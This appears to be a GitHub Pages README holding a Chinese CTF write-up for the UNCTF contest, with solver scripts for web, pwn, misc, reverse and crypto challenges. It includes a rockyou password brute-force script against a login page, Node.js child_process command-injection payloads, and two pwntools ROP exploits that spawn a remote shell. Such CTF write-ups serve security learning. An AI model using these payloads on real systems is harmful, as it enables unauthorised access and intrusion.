## Welcome to GitHub Pages

You can use the [editor on GitHub](https://github.com/hghhgghhg/hgh/edit/master/README.md) to maintain and preview the content for your website in Markdown files.

Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.

### Markdown
# UNCTF高校联合招新赛-竞技赛

## web

### 帮赵总征婚

#### 描述

华北最大安全集团NSB老总glzjin最近终于找到了girlfriend，但他现在想要six wife了，你能帮他登录一下这个NSB征婚网站吗？

http://101.71.29.5:10018/

#### 解决

由网页源码知：

~~~
<!-- I like rockyou! -->
~~~

直接使用rockyou.txt爆破密码,脚本如下：

~~~
import requests, json
f = open('rockyou.txt','r')
url = 'http://101.71.29.5:10018/login.php'
data = { 'email': 'admin', 'password': '12344','remember_me':'1' }
s = requests.Session()
r = s.post(url, data)
c = b'{"ret":0,"data":{"msg":"\\u5bc6\\u7801\\u9519\\u8bef"}}'
tmp = 'aaa'
count = 0
while r.content == c:
    a = f.readline()
    data = { 'email': 'admin', 'password': a, 'remember_me': '1' }
    r = s.post(url, data)
    tmp = a
    count += 1
    if count % 100 == 0:
        print(a)
print(tmp)
print(r.content)
~~~



### checkin

#### 描述

http://101.71.29.5:10010/

#### 解决

~~~
/calc require('child_process').execSync('ls /').toString();
/calc require('child_process').execSync('cat /flag').toString();
~~~

注意使用bp发送socket数据



## pwn

### babyrop

#### 描述

#### 解决

注意LibcSearcher的版本就好。

exp:

~~~python
# coding=utf-8
from pwn import *
import struct
from LibcSearcher import *
import time

p=remote('101.71.29.5',10041)
e=ELF('./babyrop')
libc=ELF('./libc.so.6')
p.recvuntil("Hello CTFer!")
payload=(0x2c-0xc)*'a'+'ffff'
p.sendline(payload)
vul_addr=0x0804853D
puts_plt=e.symbols['puts']
puts_got=e.got['puts']
p.recvuntil("What is your name?")
payload=(0x10+0x4)*'a'+p32(puts_plt)+p32(vul_addr)+p32(puts_got)
p.sendline(payload)
data=p.recvline()
puts_addr=u32(p.recv(4))
libc_puts_addr=libc.symbols['puts']
#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型
obj = LibcSearcher("puts", puts_addr)
libc_base=puts_addr-obj.dump("puts")
system_addr=libc_base+obj.dump("system")        #system 偏移
sh_addr=libc_base+obj.dump("str_bin_sh")    #/bin/sh 偏移
p.recvuntil("What is your name?")
ret_addr=0x0804839e
payload=(0x10+0x4)*'a'+p32(ret_addr)+p32(system_addr)+'aaaa'+p32(sh_addr)
p.sendline(payload)
p.interactive()
~~~



### Soso_easy_pwn

#### 描述

#### 解决

有一位随机，没有去搞，多跑几次就好。

exp:

~~~python
# coding=utf-8
from pwn import *
import time

p=remote('101.71.29.5',10000)
p.recvuntil("Welcome our the ")
data=hex(int(p.recvline()[:-7]))
sh_addr=int(data+'59cd',16)
print "sh_addr="+hex(sh_addr)
p.recvuntil("So, Can you tell me your name?")
payload=12*'a'+p32(sh_addr)
p.send(payload)
p.recvuntil(":")
p.sendline("3")
p.interactive()
~~~



## misc

### 快乐游戏题

#### 描述

玩游戏

#### 解决

随机一个好开局就OK了。



### EasyBox

#### 描述

nc 101.71.29.5 10011

#### 解决

题目由数独改编，只是少了一个数独的判断，就是不需要判断九宫格里面是1-9，去掉这个检测即可。

脚本如下：

```python
class Suku(object) :
    def __init__(self,broad):
        self.b = broad
    def check(self,x,y,value):
        for i in range(0,9):
            if value == self.b[x][i]:
                return False
        for j in range(0,9):
            if value == self.b[j][y]:
                return False
        return True
    def next_one(self,x,y):
        for next_y1 in range(y+1,9):
            if self.b[x][next_y1] == 0:
                return x,next_y1
        for next_x in range(x+1,9):
            for next_y2 in range(0,9):
                if self.b[next_x][next_y2] == 0:
                    return next_x,next_y2
        return -1,-1
    def try_it(self,x,y):
        if self.b[x][y] == 0:
            for i in range(1,10):
                if self.check(x,y,i):
                    self.b[x][y] = i
                    next_x,next_y = self.next_one(x,y)
                    if next_x == -1:
                        return True
                    else:
                        end = self.try_it(next_x,next_y)
                        if not end :
                            self.b[x][y] = 0
                        else:
                            return True
    def go(self):
        if self.b[0][0] == 0:
            self.try_it(0,0)
        else:
            x,y = self.next_one(0,0)
            self.try_it(x,y)
        flag = []
        for i in self.b:
            flag += i
        return flag
from pwn import *

hgh = remote('101.71.29.5','10011')
a = hgh.recvuntil('Please input row 1 answer :\n')
a = a.split('\n')
sudoku = [0] * 81
for i in range(9):
    tmp = a[i*2+9]
    count = 0
    for j in range(1,len(tmp),2):
        print(tmp[j])
        if tmp[j] != ' ':
            sudoku[i*9+count] = int(tmp[j])
        count += 1
b = []
for i in range(9):
    tmp = []
    for j in range(9):
        tmp.append(sudoku[i*9+j])
    b.append(tmp)
print(b)
c = [0] * 81
for i in range(9):
    for j in range(9):
        c[i*9+j] = b[i][j]
print(c)
s = Suku(b)
sudoku1 = s.go()
flag = []
for i in range(9):
    tmp = ''
    for j in range(9):
        if c[i*9+j] == 0:
            tmp += str(sudoku1[i*9+j])
            if j != 8:
                tmp += ','
    print(tmp)
    hgh.sendline(tmp)
    print hgh.recvline()
print hgh.recvall()
```



###   信号不好我先挂了

#### 描述

信号不好我先挂了。 Flag交不上，多换几种格式。

#### 解决

png的lsb隐写，里面有一个zip，解压里面还有一张图片，看上去和原始的图片一样，盲水印隐写。。。。



### Think

#### 描述

送分题

#### 解决

修改判断即可。

~~~python
#coding:utf-8

print """
  ____   ___  _  ___    _   _ _   _  ____ _____ _____ 
 |___ \ / _ \/ |/ _ \  | | | | \ | |/ ___|_   _|  ___|
   __) | | | | | (_) | | | | |  \| | |     | | | |_   
  / __/| |_| | |\__, | | |_| | |\  | |___  | | |  _|  
 |_____|\___/|_|  /_/   \___/|_| \_|\____| |_| |_|    
"""

(lambda __y, __operator, __g, __print: [[[[(__print("It's a simple question. Take it easy. Don't think too much about it."), [(check(checknum), None)[1] for __g['checknum'] in [(0)]][0])[1] for __g['check'], check.__name__ in [(lambda checknum: (lambda __l: [(lambda __after: (__print('Congratulation!'), (__print(decrypt(key, encrypted)), __after())[1])[1] if not __l['checknum'] else (__print('Wrong!'), __after())[1])(lambda: None) for __l['checknum'] in [(checknum)]][0])({}), 'check')]][0] for __g['decrypt'], decrypt.__name__ in [(lambda key, encrypted: (lambda __l: [[(lambda __after, __sentinel, __items: __y(lambda __this: lambda: (lambda __i: [[__this() for __l['c'] in [(__operator.iadd(__l['c'], chr((ord(__l['key'][(__l['i'] % len(__l['key']))]) ^ ord(__l['encrypted'][__l['i']].decode('base64').decode('hex'))))))]][0] for __l['i'] in [(__i)]][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())(lambda: __l['c'], [], iter(range(len(__l['encrypted'])))) for __l['c'] in [('')]][0] for __l['key'], __l['encrypted'] in [(key, encrypted)]][0])({}), 'decrypt')]][0] for __g['encrypted'] in [(['MTM=', 'MDI=', 'MDI=', 'MTM=', 'MWQ=', 'NDY=', 'NWE=', 'MDI=', 'NGQ=', 'NTI=', 'NGQ=', 'NTg=', 'NWI=', 'MTU=', 'NWU=', 'MTQ=', 'MGE=', 'NWE=', 'MTI=', 'MDA=', 'NGQ=', 'NWM=', 'MDE=', 'MTU=', 'MDc=', 'MTE=', 'MGM=', 'NTA=', 'NDY=', 'NTA=', 'MTY=', 'NWI=', 'NTI=', 'NDc=', 'MDI=', 'NDE=', 'NWU=', 'MWU='])]][0] for __g['key'] in [('unctf')]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), __import__('operator', level=0), globals(), __import__('__builtin__', level=0).__dict__['print'])

~~~



## reverse

### unctf_f@ck_re

#### 描述

题目打不开了。。。

#### 解决

没有捷径，手动一点点逆。

~~~python
a = [0x2C, 0x21, 0x1E, 0x73, 0x32, 0x12, 0x72, 0x37, 0x10, 0x38, 0x38, 1, 0x1D, 0x6B, 0x66, 0x79, 0x79, 0x26]
for i in range(len(a)):
    a[i]  = a[i] ^ 69
b = []
for i in range(18):
    b.append(0)
v16 = 0
v5 = [1,5,4,2,3,0]
for i in range(18):
    tmp = (6 * (v16 // 6) + v5[v16 % 6])
    b[tmp] = a[i]
    v16 = v16 + 1
for i in range(18):
    print(chr(b[i]^i),end = '')



e = [204,34,127,82,82,39,170,72,52,114,95,208,15,39,107,57]

b = [0x1B,0x5D,0x42,0x2B,0x0D,0x5,0x48,0x0E6,0x35,0x16,0x9E,0x0B5,0x0BB,0x0E3,0x24,0x0F,0x13,0x0C0,0x59,0x96,0x5A,0x12,0x2B,0x0E0,0x8F,0x21,0x8C,0x52,0x0DE,0x92,0x12,0x84,0x0A3,0x0E2,0x6E,0x7B,0x76,0x0A2,0x0F,0x51,0x93,0x0A9,0x78,0x0AB,0x5F,0x5E,0x16,0x82,0x72,0x82,0x26,0x0D1,0x26,0x0D4,0x9,0x0BF,0x74,0x0DA,0x0A7,0x3E,0x99,0x2,0x65,0x0C3,0x0B3,0x0AD,0x0E0,0x5A,0x0AB,0x7A,0x83,0x93,0x3F,0x0A4,0x11,0x3D,0x8E,0x0D,0x0DF,0x5A,0x71,0x8,0x3A,0x0C8,0x0F4,0x90,0x16,0x1B,0x88,0x0C6,0x50,0x6F,0x0D1,0x0A4,0x0B3,0x73,0x7B,0x82,0x0BF,0x0B2,0x5F,0x94,0x0DE,0x0CA,0x5A,0x5E,0x0AB,0x25,0x0BE,0x8C,0x1B,0x80,0x65,0x9E,0x0EC,0x5A,0x37,0x2A,0x75,0x2C,0x2D,0x0BA,0x56,0x0D0,0x0BA,0x3A,0x0B6,0x94,0x81,0x70,0x87,0x75,0x3D,0x48,0x63,0x7D,0x52,0x81,0x39,0x0B5,0x23,0x0D4,0x0D3,0x0DD,0x4B,0x0D9,0x0B8,0x35,0x0A3,0x0CA,0x40,0x77,0x52,0x7C,0x9E,0x6C,0x42,0x0D8,0x53,0x6F,0x0EA,0x2E,0x0C,0x9A,0x0F3,0x2A,0x6A,0x0D5,0x0EA,0x6B,0x93,0x2F,0x18,0x5C,0x0BE,0x96,0x0B4,0x26,0x0F,0x0DB,0x9F,0x7,0x30,0x0AF,0x93,0x34,0x27,0x8E,0x0A,0x0CA,0x53,0x0B7,0x0C9,0x8F,0x9B,0x40,0x87,0x54,0x50,0x53,0x1E,0x55,0x6,0x4,0x87,0x0C9,0x5E,0x78,0x0A0,0x3F,0x66,0x8,0x0B0,0x9,0x6E,0x83,0x0E5,0x6C,0x23,0x0E6,0x74,0x83,0x1,0x0A4,0x7F,0x62,0x39,0x9,0x94,0x32,0x0D3,0x88,0x93,0x61,0x0C2,0x0C6,0x61,0x6B,0x28,0x0C7,0x61,0x0DD,0x0DB,0x90,0x0A9,0x0D5,0x0D8,0x8A,0x0A4,0x0A0,0x65,0x0C1,0x35,0x41,0x0BA,0x0CF,0x4A,0x47,0x0CA,0x0AF,0x51,0x0E1,0x72,0x5A,0x0BF,0x1E,0x0B3,0x7A,0x80,0x0F2,0x7A,0x0CB,0x25,0x0E6,0x98,0x96,0x1B,0x53,0x44,0x0D8,0x3C,0x0AC,0x12,0x0B1,0x64,0x47,0x35,0x0]
res = []
for i in range(4):
    tmp = (e[4*i] * 0x1000000 + e[4*i+1] * 0x10000 + e[4*i+2] * 0x100 + e[4*i+3])
    res.append(hex(tmp))


def right (int_value,k,bit = 32):
    bit_string = '{:0%db}' % bit
    bin_value = bit_string.format(int_value) # 8 bit binary
    bin_value = bin_value[-k:] + bin_value[:-k]
    int_value = int(bin_value,2)
    return int_value
def left (int_value,k,bit = 32):
 bit_string = '{:0%db}' % bit
 bin_value = bit_string.format(int_value) # 8 bit binary
 bin_value = bin_value[k:] + bin_value[:k]
 int_value = int(bin_value,2)
 return int_value

def fun2(w):
    if 32<=w<=126:
        return chr(w)
    else:
        return ''

def fun1(w):
    w4 = w % 0x100

    w3 = (w % 0x10000 - w4) //0x100
    w2 = (w % 0x1000000 -w3) // 0x10000
    w1 = (w // 0x1000000)

    w4 = b[w4]
    w3 = b[w3]
    w2 = b[w2]
    w1 = b[w1]

    a = (w1 * 0x1000000 + w2 * 0x10000 + w3 * 0x100 + w4 )

    v2 = right(a, 6)
    v3 = right(a, 8) ^ v2
    v4 = left(a, 10) ^ v3
    return v4 ^ left(a, 12)
res = [0xf276b39, 0x34725fd0, 0x5227aa48, 0xcc227f52]

for i in range(30):
    w = res[i+1] ^ res[i+2] ^ res[i+3]
    ans = fun1(w) ^ res[i+0]
    res.append((ans))
print('')

a = ''
for i in res[26:30]:
    w4 = i % 0x100
    w3 = (i % 0x10000 - w4) // 0x100
    w2 = (i % 0x1000000 - w3) // 0x10000
    w1 = i // 0x1000000
    a += fun2(w1)
    a += fun2(w2)
    a += fun2(w3)
    a += fun2(w4)
print(a[::-1])
~~~





### 奇怪的数组

#### 描述

https://xpro-adl.91ctf.com/userdownload?filename=1910255db2c901050ae.zip&type=attach&feature=custom

#### 解决

只要会IDA就好。

看懂逻辑，将数据取出来，16进制数据顺序排一下就好。



### easyvm

#### 描述

https://xpro-adl.91ctf.com/userdownload?filename=1910255db2c8fd2e603.zip&type=attach&feature=custom

#### 解决

这个题我偷了一下懒，直接angr库跑的。

~~~python
import angr

proj = angr.Project("easyvm")
simgr = proj.factory.simgr()
simgr.explore(find=lambda s: b"Congratulations!" in s.posix.dumps(1))
f = open('flag.txt','wb')
f.write(simgr.found[0].posix.dumps(0))
print(simgr.found[0].posix.dumps(0))
~~~



### unctf_easy_Maze

#### 描述

https://xpro-adl.91ctf.com/userdownload?filename=1910255db2c8feec529.zip&type=attach&feature=custom

#### 解决

这个题目的难点在于将变换之后的迷宫拿出来，采取动态调试。但是OD只能跑32位的，所以用IDA pro的远程虚拟机调试功能即可。只要在第二轮迷宫变换后将迷宫的01数据取出（7*7），顺着1的路走就好。（wasd）



### Easy_Android

#### 描述

玩手机喽。

https://xpro-adl.91ctf.com/userdownload?filename=1910255db2c9004c51d.zip&type=attach&feature=custom

#### 解决

apk反编译，查看jar包。注意jd-gui有一个类的一个函数反编译不了（就是MD5那个函数），多换几个反编译工具就好。

基本逻辑：

使用未知32位长的字符串和里面的假flag进行异或。将异或后的字符串，每4个一组，总共8组。对每组字符串进行MD5，MD5值是已知的，求解未知32位字符串。

由前面的逆向题推断，这32个字符串是由“0123456789abcdef”组成（或者大写）。

要不然根本不可能跑出来的。

爆破脚本：

~~~python
import hashlib

a =[ "2061e19de42da6e0de934592a2de3ca0"
        , "a81813dabd92cefdc6bbf28ea522d2d1"
        , "4b98921c9b772ed5971c9eca38b08c9f"
        , "81773872cbbd24dd8df2b980a2b47340"
        , "73b131aa8e4847d27a1c20608199814e"
        , "bbd7c4e20e99f0a3bf21c148fe22f21d"
        , "bf268d46ef91eea2634c34db64c91ef2"
        , "0862deb943decbddb87dbf0eec3a06cc"
        , "7a59d932e8184ae963c40a759cc38fec"]
s = '0123456789abcdef'
flag = 'flag{this_is_a_fake_flag_ahhhhh}'
ou = ''
for l in range(8):
    for i in range(16):
        for j in range(16):
            for k in range(16):
                for z in range(16):
                    tmp = s[i] + s[j] + s[k] + s[z]
                    tt = hex(int(tmp.encode('hex'),16)^int(flag[l*4:l*4+4].encode('hex'),16))[2:].zfill(8).decode('hex')
                    if hashlib.md5(tt).hexdigest()== a[l]:
                        ou += tmp
print(ou)

# 'bd1d6ba7f1d3f5a13ebb0a75844cccfa'
~~~



### 666

#### 描述

https://xpro-adl.91ctf.com/userdownload?filename=1910255db2c8fcb4fde.zip&type=attach&feature=custom

#### 解决

这个没什么好说的，逆向签到题

简单的逆回去。

### BabyXor

#### 描述

答案提交flag{}括号内的值。

#### 解决

输入没有任何作用，可知flag就在里面，OD动态调试一波。

flag有3段，慢慢看就好。（结合IDA，看函数地址可以加快过程）

## crypto

### ECC和AES基础

#### 描述

unctf_ECC和AES基础 请到http://132.232.125.125 POST flag=你的flag

#### 解决

题目逻辑很简单，flag被aes加密，但是aes的密钥不知道。

aes密钥被ECC加密的。ECC公钥已知，由于素数不大，所以直接爆破私钥（而且也只有这个办法，要不然不可能解密的。当然如果知道key是一个很小的数字，直接跳过ECC，直接AES密钥爆破也行。）

ECC解密：

~~~sage
E=EllipticCurve(GF(15424654874903),[16546484,4548674875])
G=E(6478678675, 5636379357093)
K=(2854873820564,9226233541419)
k = 2
c = k*G
while c[0] != K[0]:
    c += G
    k += 1
#k = 2019813
print(k*G)
c1 = E(6860981508506,1381088636252)
c2 = E(1935961385155,8353060610242)
m = c1 - k*c2
print(m)
#(2854873820564 : 9226233541419 : 1)
#(1026 : 7441725552408 : 1)
~~~



aes解密：

~~~python
from Crypto.Cipher import AES
import base64


key = bytes('1026'.ljust(16,' '))
aes = AES.new(key,AES.MODE_ECB)

# encrypt
plain_text = bytes('this_is_a_flag'.ljust(16,' '))
text_enc = aes.encrypt(plain_text)
text_enc_b64 = base64.b64encode(text_enc)
print(text_enc_b64)
c = '/cM8Nx+iAidmt6RiqX8Vww=='
flag = aes.decrypt(base64.b64decode(c))
print(flag)
#output:/cM8Nx+iAidmt6RiqX8Vww==
#this_is_a_flag
~~~

然后按照描述操作。

### simple_rsa

#### 描述

https://xpro-adl.91ctf.com/userdownload?filename=1910255db2c8d60a1b4.zip&type=attach&feature=custom

#### 解决

就是一个简单的rsa，但是要去猜测n的组成。

n很大，如果要解这个题，肯定是有小素数。

通过`PollardRho_p_1`算法求出小素数。

发现有7个`1043705605371301`.

本来还想继续去分解，但是想到：

~~~
flag='XXXXXXXXXX'
~~~

flag应该不大，所以那`1043705605371301`的7次方应该就够了。主要它的欧拉值和e互素就一定能解。幸运的是，满足以上要求。直接RSA解密即可。

脚本：

~~~python
#!/usr/bin/env python2
# -*- coding:utf8 -*-
from Crypto.Util.number import *
from gmpy2 import *

# flag='XXXXXXXXXX'
e=0x10001
n=3464115689260819392935656139231271022088014497600959975252672820761470484618617542699739764705620767566046150296286140279466041905437740736319886548924058066340624280173573039937440574809212831672936265975209972857747738693288788052694888593629820783280181774594890101819911390468376042288685444703477639361249422054925155575158181408046447773183467474182159096249846479461475003039637685547191529769071424947165685996675043741359728960138725130116665515880652680244470002603320184043266997163009799067135481330853926800023087208636366543210276325733789567957712475079676808820490428973148590780103404729397985019089646026534758042652163974037179260930147000267787012874887703048185189387666199961350969478997330352491403611551096779887936063702892671572230523920277869824082318417366635732798078805070773662305098133013800559413976855639167085996705265872418286939474978058429877355305699191892248323534097124680592084808397263288943661630283254265898940430505371463275516870915261799702701453110383723660477322192658118815861974573497885759332587457883589126213868868281682733732394640188383458580555618181208722172011645063817887462511925363883111475043389367021569982583145912277082528397480756465818166640691294267829613428532584923122279261412957652411789780285394451850006055483598427256129336822790446219260722224551892755568723667049099823707012236618539013908897459508493477299241358343681962043777720375898238069411747593247677719659288861028038609681592049271388766040068274682329498410270047730060645409396168652996740411436504098243588534151795927613112273405281530700440843961363083171583053608594479571127638861391879160062136043924515492933057094406001740725150570943724333872057035272515676895138632004436149126542560186729495087753846670118167613304943153665660470977150177815354160112481310498255965933157902965011317272734556307544837058247794721427834401390455487872367113056168812990496943458920406382650794656884209032284257748450399719067686010156664485086500184078244358783696803659745365860507822269113477617988541658390715640119076036723560146145256418191555730429
# m=bytes_to_long(flag)
# c=pow(m,e,n)
# print(c)
c =1348180992713820685594359831085361247035354818267759694375727771380213764105201303900290589048476671838784929302557807429509301123621642066527762448168417430350203900517746161928291953862336621873868684964993481406952303460424386080800907869577832154132021624995347121475139439850224598911049824567475034545196149320206620924509546294914370633958171840525667753751028800452370972967842349036965813468093121305475860652163573748880159896028384459277781803606279654121781761535513864212749202340439422384362197321739535686506006254445152569135807838677803047115947240251817017395748631234023225248868640103807357800695487118067385969130665294711887439861169737031598274672286881054564295019370600398079829687943670066246766386800967129670975899437309257181151390273864539453238400821713398980792443187238155205199387468000884390778225928491109565539772444103430764411852162036780535068932010631521096301305200494731040799554079996593223419379540630567412342494359961515157700054387356888773321804429041668331430841954949061238002355270616266853430676140296078177898764114420743905073496118755793091902224563802923183897542996809393707165837427396760691616506592877656939455806776333105152244073459704842848097376929745632888315642056267589901527329593161439752243318158600747713335265681764274061086952626629147275106502354039293870614872849851780761537660716667003562253735923584765118319171207551032289722689929226947535724389015974764265109970513715649126340709399701638880824570967389428525179746112494690443526404899052482884526335312491500994658519105204100875596292743155076199283666094556235485722975240358390560161706163569618302627055238860096406627340558428533728688904747040262153892623865784320600845613247625784683300197845026108394831724602330903266980995146046956218083954561639114586880305451066793209385702886944430548686040360906088479432852330611586273784509957389880104225534635731572089138568407411433675077699382999593384336070450058824669351046095205147266720901917218217564113964074957585348227506587531149811564371155522575778721899999227020238022970334707476977210019
def PollardRho_p_1(Q,N):
    a = i = 2
    while 1:
        a = pow(a, i, N)
        d = gcd(a - 1, N)
        if d != 1:
            return d
        i += 1
# print(PollardRho_p_1(1,n))
p = 1043705605371301
n1 = p**7
phi = (p-1)*(p**6)
d = invert(e,phi)
c = c % n1
print(hex(pow(c,d,n1))[2:].decode('hex'))
#flag{G0oDJ0b_S0_SimPle_ChaMd5}
~~~

